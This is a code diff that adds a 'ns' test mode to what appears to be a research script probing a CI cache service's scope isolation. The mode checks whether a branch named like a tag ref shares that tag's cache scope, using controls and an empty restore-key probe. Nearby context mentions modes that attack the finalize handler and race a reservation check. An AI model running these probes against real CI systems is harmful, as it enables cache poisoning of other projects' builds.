@@ -290,6 +290,19 @@ const V1 = '0000000000000000000000000000000000000000000000000000000000000001';
     await report('inj');
   }
 
+  if (MODE === 'ns') {
+    // ---- does a branch whose name encodes 'refs/tags/<t>' share the tag's cache scope? ----
+    // the tag refs/tags/cbtag2 holds a reservation for cbtagns-<nonce> at MAINVER.
+    // 409 here = the two scope strings resolved to the same scope. 200 = isolated.
+    const RV = MAINVER || V1;
+    await twirp('NS-reserve-tagkey', 'CacheService/CreateCacheEntry', { key: 'cbtagns-' + NONCE, version: RV });
+    await twirp('NS-read-tagkey', 'CacheService/GetCacheEntryDownloadURL', { key: 'cbtagns-' + NONCE, version: RV });
+    await twirp('NS-poscontrol-base', 'CacheService/GetCacheEntryDownloadURL', { key: MAINKEY, version: RV });
+    await twirp('NS-negcontrol-never', 'CacheService/GetCacheEntryDownloadURL', { key: 'cbnever-' + NONCE, version: RV });
+    await twirp('NS-emptyprefix', 'CacheService/GetCacheEntryDownloadURL', { key: 'zzz-' + Date.now(), restoreKeys: [''], version: RV });
+    await report('ns-' + Date.now());
+  }
+
   if (MODE === 'fin') {
     // ---- unprivileged ref: attack the FINALIZE handler + race the reservation check ----
     const RV = MAINVER || V1;
